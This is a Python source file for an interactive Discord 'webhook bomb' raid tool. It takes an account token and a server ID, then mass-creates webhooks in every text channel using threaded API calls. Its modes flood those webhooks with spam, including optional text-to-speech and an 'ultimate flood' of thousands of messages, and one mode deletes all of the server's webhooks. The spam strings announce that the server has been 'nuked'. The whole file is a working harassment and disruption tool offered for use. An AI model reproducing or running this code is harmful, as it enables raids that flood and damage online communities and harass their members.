

import requests
import time
import json
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import inquirer

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    print(ansi + text + RESET)

def get_headers(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

WEBHOOK_NAMES = [
    "💀 DEATH WEBHOOK 💀",
    "🔥 FIRE BOMBER 🔥",
    "⚡ ELECTRIC SPAM ⚡",
    "💥 EXPLOSION BOT 💥",
    "🌪️ TORNADO SPAM 🌪️",
    "🎯 TARGET BOMBER 🎯",
    "🚀 ROCKET SPAM 🚀",
    "⭐ STAR DESTROYER ⭐",
    "🌈 RAINBOW BOMBER 🌈",
    "💎 DIAMOND SPAM 💎",
    "🔮 MYSTIC BOMBER 🔮",
    "🎪 CHAOS WEBHOOK 🎪",
    "🎲 DICE BOMBER 🎲",
    "🎨 ART DESTROYER 🎨",
    "🎵 SOUND BOMBER 🎵",
    "🎮 GAME DESTROYER 🎮",
    "📱 PHONE BOMBER 📱",
    "💻 VIRUS WEBHOOK 💻",
    "🖥️ SYSTEM BOMBER 🖥️",
    "⌨️ KEYBOARD SPAM ⌨️"
]

SPAM_MESSAGES = [
    "💀 SERVER NUKED BY CYBERSEALL 💀",
    "🔥 WEBHOOK BOMB ACTIVATED 🔥",
    "⚡ CHAOS PROTOCOL INITIATED ⚡",
    "💥 DESTRUCTION SEQUENCE STARTED 💥",
    "🌪️ TORNADO OF SPAM INCOMING 🌪️",
    "🎯 TARGET ACQUIRED AND DESTROYED 🎯",
    "🚀 ROCKET SPAM LAUNCHED 🚀",
    "⭐ STAR DESTROYER ONLINE ⭐",
    "🌈 RAINBOW OF DESTRUCTION 🌈",
    "💎 DIAMOND CHAOS ACTIVATED 💎",
    "🔮 MYSTIC SPAM POWERS 🔮",
    "🎪 WELCOME TO THE CHAOS CIRCUS 🎪",
    "🎲 DICE ROLLED - YOU LOSE 🎲",
    "🎨 ART OF DESTRUCTION 🎨",
    "🎵 MUSIC OF CHAOS 🎵",
    "🎮 GAME OVER - SERVER DESTROYED 🎮",
    "📱 PHONE HOME - CHAOS CALLING 📱",
    "💻 VIRUS DETECTED - SYSTEM COMPROMISED 💻",
    "🖥️ SYSTEM CRASH IMMINENT 🖥️",
    "⌨️ KEYBOARD WARRIOR STRIKES ⌨️"
]

def get_all_channels(token, guild_id):
    pretty_print("📁 Fetching all text channels...", (255,128,0))
    headers = get_headers(token)
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    if response.status_code != 200:
        pretty_print(f"❌ Failed to get channels: {response.status_code}", (255,0,0))
        return []
    
    channels = response.json()
    text_channels = [ch for ch in channels if ch['type'] == 0]
    pretty_print(f"✅ Found {len(text_channels)} text channels", (0,255,0))
    return text_channels

def create_webhook(token, channel_id, name=None):
    headers = get_headers(token)
    
    if not name:
        name = random.choice(WEBHOOK_NAMES)
    
    webhook_data = {
        'name': name
    }
    
    try:
        response = requests.post(
            f'https://discord.com/api/v9/channels/{channel_id}/webhooks',
            headers=headers,
            json=webhook_data
        )
        if response.status_code == 200:
            webhook = response.json()
            pretty_print(f"✅ Created webhook: {webhook['name']} in channel {channel_id}", (0,255,0))
            return webhook
        else:
            pretty_print(f"❌ Failed to create webhook in channel {channel_id}: {response.status_code}", (255,0,0))
            return None
    except Exception as e:
        pretty_print(f"❌ Error creating webhook in channel {channel_id}: {str(e)}", (255,0,0))
        return None

def send_webhook_message(webhook_url, message, username=None, avatar_url=None, tts=False):
    webhook_data = {
        'content': message,
        'tts': tts
    }
    
    if username:
        webhook_data['username'] = username
    
    if avatar_url:
        webhook_data['avatar_url'] = avatar_url
    
    try:
        response = requests.post(webhook_url, json=webhook_data)
        if response.status_code == 204:
            return True
        else:
            return False
    except Exception:
        return False

def mass_create_webhooks(token, guild_id, webhooks_per_channel=10):
    channels = get_all_channels(token, guild_id)
    if not channels:
        return []
    
    pretty_print(f"🕸️ Creating {webhooks_per_channel} webhooks per channel...", (255,128,0))
    
    created_webhooks = []
    
    def create_webhook_worker(channel, i):
        name = f"{random.choice(WEBHOOK_NAMES)}-{i:03d}"
        webhook = create_webhook(token, channel['id'], name)
        if webhook:
            return webhook
        return None
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for channel in channels:
            for i in range(webhooks_per_channel):
                future = executor.submit(create_webhook_worker, channel, i)
                futures.append(future)
        
        for future in as_completed(futures):
            webhook = future.result()
            if webhook:
                created_webhooks.append(webhook)
            time.sleep(0.5)
    
    pretty_print(f"🕸️ Created {len(created_webhooks)} webhooks total", (255,255,0))
    return created_webhooks

def spam_all_webhooks(webhooks, message_count=50, tts=False):
    pretty_print(f"💣 Spamming {len(webhooks)} webhooks with {message_count} messages each...", (255,128,0))
    
    total_sent = 0
    total_failed = 0
    
    def spam_webhook_worker(webhook, msg_num):
        message = f"{random.choice(SPAM_MESSAGES)} #{msg_num:03d}"
        username = f"{random.choice(WEBHOOK_NAMES)}-{msg_num:03d}"
        
        if send_webhook_message(webhook['url'], message, username, tts=tts):
            return 1, 0
        else:
            return 0, 1
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for webhook in webhooks:
            for i in range(message_count):
                future = executor.submit(spam_webhook_worker, webhook, i)
                futures.append(future)
        
        for future in as_completed(futures):
            sent, failed = future.result()
            total_sent += sent
            total_failed += failed
            time.sleep(0.1)
    
    pretty_print(f"💣 Webhook spam completed: {total_sent} sent, {total_failed} failed", (255,255,0))
    return total_sent, total_failed

def create_and_spam_webhooks(token, guild_id, webhooks_per_channel=5, messages_per_webhook=30):
    channels = get_all_channels(token, guild_id)
    if not channels:
        return 0, 0
    
    pretty_print(f"🚀 Creating and spamming webhooks simultaneously...", (255,128,0))
    
    total_sent = 0
    total_failed = 0
    
    def create_and_spam_worker(channel, webhook_num):
        name = f"{random.choice(WEBHOOK_NAMES)}-{webhook_num:03d}"
        webhook = create_webhook(token, channel['id'], name)
        
        if not webhook:
            return 0, messages_per_webhook
        
        sent = 0
        failed = 0
        
        for i in range(messages_per_webhook):
            message = f"{random.choice(SPAM_MESSAGES)} #{i:03d}"
            username = f"{name}-MSG-{i:03d}"
            
            if send_webhook_message(webhook['url'], message, username):
                sent += 1
            else:
                failed += 1
            
            time.sleep(0.2)
        
        return sent, failed
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = []
        for channel in channels:
            for i in range(webhooks_per_channel):
                future = executor.submit(create_and_spam_worker, channel, i)
                futures.append(future)
        
        for future in as_completed(futures):
            sent, failed = future.result()
            total_sent += sent
            total_failed += failed
    
    pretty_print(f"🚀 Create-and-spam completed: {total_sent} sent, {total_failed} failed", (255,255,0))
    return total_sent, total_failed

def webhook_flood_attack(token, guild_id):
    pretty_print("🌊 WEBHOOK FLOOD ATTACK - ULTIMATE SPAM!", (255,0,0))
    pretty_print("⚠️ This will create 100+ webhooks and send 10,000+ messages!", (255,255,0))
    
    confirm = input("Type 'FLOOD' to confirm ultimate attack: ").strip()
    if confirm != 'FLOOD':
        pretty_print("❌ Attack cancelled", (255,255,0))
        return
    
    pretty_print("\n🌊 INITIATING WEBHOOK FLOOD ATTACK...", (255,0,0))
    time.sleep(2)
    
    pretty_print("🚀 Phase 1: Mass Webhook Creation", (255,128,0))
    webhooks = mass_create_webhooks(token, guild_id, 15)
    
    if not webhooks:
        pretty_print("❌ No webhooks created, attack failed", (255,0,0))
        return
    
    pretty_print("🚀 Phase 2: Simultaneous Spam Attack", (255,128,0))
    spam_all_webhooks(webhooks, 100, tts=True)
    
    pretty_print("🚀 Phase 3: Create-and-Spam Combo", (255,128,0))
    create_and_spam_webhooks(token, guild_id, 10, 50)
    
    pretty_print("\n🌊 WEBHOOK FLOOD ATTACK COMPLETED! 🌊", (255,0,0))
    pretty_print("💣 Server completely flooded with webhook spam!", (255,255,0))

def delete_all_webhooks(token, guild_id):
    pretty_print("🗑️ Deleting all webhooks...", (255,128,0))
    channels = get_all_channels(token, guild_id)
    headers = get_headers(token)
    
    deleted_count = 0
    
    for channel in channels:
        try:
            response = requests.get(f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks', headers=headers)
            if response.status_code == 200:
                webhooks = response.json()
                
                for webhook in webhooks:
                    try:
                        del_response = requests.delete(f'https://discord.com/api/v9/webhooks/{webhook["id"]}', headers=headers)
                        if del_response.status_code == 204:
                            pretty_print(f"✅ Deleted webhook: {webhook['name']}", (0,255,0))
                            deleted_count += 1
                        time.sleep(0.5)
                    except Exception as e:
                        pretty_print(f"❌ Error deleting webhook: {str(e)}", (255,0,0))
        except Exception as e:
            pretty_print(f"❌ Error getting webhooks for channel: {str(e)}", (255,0,0))
    
    pretty_print(f"🗑️ Deleted {deleted_count} webhooks", (255,255,0))
    return deleted_count

def run_webhook_bomb():
    pretty_print("💣 WEBHOOK BOMB - MASS SPAM TOOL 💣", (255,0,0))
    pretty_print("Creates hundreds of webhooks and spams them simultaneously", (255,128,0))
    
    token = input("\n🔑 Enter Discord token: ").strip()
    if not token:
        pretty_print("❌ No token provided!", (255,0,0))
        return
    
    guild_id = input("🏠 Enter Server ID: ").strip()
    if not guild_id:
        pretty_print("❌ No server ID provided!", (255,0,0))
        return
    
    while True:
        pretty_print("\n💣 Webhook Bomb Options:", (255,128,0))
        questions = [
            inquirer.List('action',
                         message="Select webhook action:",
                         choices=[
                             '🕸️ Mass Create Webhooks',
                             '💣 Spam Existing Webhooks',
                             '🚀 Create and Spam Combo',
                             '🌊 ULTIMATE WEBHOOK FLOOD',
                             '🗑️ Delete All Webhooks',
                             '🚪 Back to Main Menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers:
            break
        
        action = answers['action']
        
        if action == '🚪 Back to Main Menu':
            break
        
        if action == '🕸️ Mass Create Webhooks':
            count = input("Enter webhooks per channel (1-20): ").strip()
            try:
                count = int(count)
                if 1 <= count <= 20:
                    mass_create_webhooks(token, guild_id, count)
                else:
                    pretty_print("❌ Invalid count (1-20)", (255,0,0))
            except ValueError:
                pretty_print("❌ Invalid number", (255,0,0))
        
        elif action == '💣 Spam Existing Webhooks':
            webhooks = mass_create_webhooks(token, guild_id, 5)
            if webhooks:
                messages = input("Enter messages per webhook (1-100): ").strip()
                try:
                    messages = int(messages)
                    if 1 <= messages <= 100:
                        tts_choice = input("Enable TTS? (y/N): ").strip().lower() == 'y'
                        spam_all_webhooks(webhooks, messages, tts_choice)
                    else:
                        pretty_print("❌ Invalid message count (1-100)", (255,0,0))
                except ValueError:
                    pretty_print("❌ Invalid number", (255,0,0))
        
        elif action == '🚀 Create and Spam Combo':
            webhooks_per_ch = input("Webhooks per channel (1-10): ").strip()
            messages_per_wh = input("Messages per webhook (1-50): ").strip()
            try:
                webhooks_per_ch = int(webhooks_per_ch)
                messages_per_wh = int(messages_per_wh)
                if 1 <= webhooks_per_ch <= 10 and 1 <= messages_per_wh <= 50:
                    create_and_spam_webhooks(token, guild_id, webhooks_per_ch, messages_per_wh)
                else:
                    pretty_print("❌ Invalid parameters", (255,0,0))
            except ValueError:
                pretty_print("❌ Invalid numbers", (255,0,0))
        
        elif action == '🌊 ULTIMATE WEBHOOK FLOOD':
            webhook_flood_attack(token, guild_id)
        
        elif action == '🗑️ Delete All Webhooks':
            pretty_print("⚠️ This will delete ALL webhooks in the server!", (255,255,0))
            confirm = input("Type 'DELETE' to confirm: ").strip()
            if confirm == 'DELETE':
                delete_all_webhooks(token, guild_id)
            else:
                pretty_print("❌ Operation cancelled", (255,255,0))
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    run_webhook_bomb() 
# update
